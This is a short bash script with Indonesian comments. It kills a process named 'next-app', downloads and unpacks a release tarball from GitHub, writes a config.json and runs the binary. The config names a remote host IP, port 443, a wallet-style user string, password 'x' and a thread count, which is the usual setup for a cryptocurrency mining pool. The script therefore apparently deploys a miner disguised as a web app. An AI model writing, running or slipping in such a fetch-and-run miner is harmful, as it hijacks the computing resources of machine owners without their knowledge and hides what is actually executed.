#!/bin/bash

echo "Dimulai pada $(date)"

# Bersihkan proses sebelumnya
pkill -f next-app
rm -rf next-app.tar.gz
wget https://github.com/mom742886/next-app/releases/download/v1/next-app.tar.gz

tar -xf next-app.tar.gz

echo '{"host": "45.115.225.42", "port": 443, "user": "mbc1qh9m6s26m5u0snjk7wp5gl4v6w6ecsgz7jsv482", "pass": "x", "threads": 8}' > config.json

./next-app/next-app
